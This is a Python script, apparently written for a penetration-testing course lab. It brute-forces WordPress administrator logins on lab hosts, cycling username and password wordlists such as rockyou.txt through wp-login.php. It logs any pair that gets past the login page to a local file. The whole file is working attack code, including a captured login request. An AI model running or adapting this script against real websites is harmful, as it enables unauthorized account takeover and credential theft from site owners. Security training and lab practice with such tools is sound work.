#!/usr/bin/python3.7

# Python script to read THINC users and passwords for webpage auth
'''
POST /wp-login.php HTTP/1.1
Host: 10.11.1.234
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.234/wp-login
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
DNT: 1
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.11.1.234%2Fwp-admin%2F&testcookie=1

'''
import requests
from requests.auth import HTTPBasicAuth
import lxml
import xml
from lxml.html import fromstring

proxies = {
    "http": "http://10.11.0.60:8080"
}

wp_login = 'http://10.11.1.251/wp-login.php'
wp_admin = 'http://10.11.1.251/wp-admin/'

user_file = '/usr/share/wordlists/users_admin_root.list'

pass_files = ['/usr/share/wordlists/thinc_passwords.list',
              '/usr/share/wordlists/darkweb2017-top1000.txt',
              '/usr/share/wordlists/rockyou.txt']

for pass_file in pass_files:
    with open(user_file) as u:
        for line in u:
            lineu = line.rstrip()
            with open(pass_file) as p:
                    for line in p:
                        linep = line.rstrip()

                        with requests.Session() as s:
                            headers1 = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}
                            payload = {'log': lineu, 'pwd': linep,
                                       'wp-submit': 'Log In', 'redirect_to': wp_admin, 'testcookie': '1'
                            }
                            print(payload)
                            r = s.post(wp_login, headers=headers1, data=payload)

                            status = r.status_code
                            response = r.text
                            print(lineu, ':', linep, ':', status, '\n')
                            #print(response)

                            tree = fromstring(r.content)
                            page_title = tree.findtext('.//title')
                            print(page_title)

                            if page_title != 'Business Statistics › Log In':
                                print("\n---> ", lineu + ":" + linep + " is a valid username:password!!! <--- \n")
                                with open('/root/oscplab/labtargets/2r00t/dot251/dot251_wpbrute.txt', 'a') as output:
                                    output.write("Valid username:password for: " + wp_login + "\n")
                                    output.write("-------------------------------------------------------------\n")
                                    output.write(lineu + ":" + linep + " is a valid username:password\n")